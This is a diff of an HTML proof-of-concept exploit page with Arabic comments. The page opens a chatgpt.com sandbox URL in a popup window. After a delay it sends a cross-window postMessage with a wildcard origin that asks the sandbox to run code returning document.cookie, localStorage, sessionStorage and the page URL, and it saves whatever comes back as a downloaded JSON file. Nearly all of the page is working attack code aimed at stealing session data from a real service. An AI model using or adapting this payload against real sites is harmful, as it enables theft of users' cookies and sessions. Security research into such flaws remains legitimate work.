@@ -6,7 +6,7 @@
 </head>
 <body>
   <h2>🚀 Remote Data Extraction PoC</h2>
-  <button onclick="launch()">Open & Exploit Sandbox</button>
+  <button id="launchBtn">Open & Exploit Sandbox</button>
 
   <script>
     let victimWin;
@@ -14,7 +14,7 @@
     function launch() {
       console.log("🚀 Remote PoC started...");
 
-      // 🔗 استبدل هذا بالرابط الصحيح اللي يطلع لك من preview
+      // 🔗 حط هنا رابط sandbox الحقيقي (اللي يطلع لك من preview)
       const sandboxUrl = "https://chatgpt.com/ces/v1/t";
 
       victimWin = window.open(sandboxUrl, "victim", "width=900,height=700");
@@ -29,5 +29,21 @@
         a.href = url;
         a.download = "sandbox_data_" + Date.now() + ".json";
         a.click();
-        c
+        console.log("💾 File download triggered.");
+      });
 
+      // انتظر شوية ثم ابعث payload
+      setTimeout(() => {
+        console.log("📡 Sending exploit payload to sandbox...");
+        victimWin.postMessage(
+          ["CALL", "runUserCode", ["return {cookies: document.cookie, localStorage, sessionStorage, url: location.href}"]],
+          "*"
+        );
+      }, 5000);
+    }
+
+    // اربط الزر بالدالة بعد تحميل الصفحة
+    document.getElementById("launchBtn").addEventListener("click", launch);
+  </script>
+</body>
+</html>
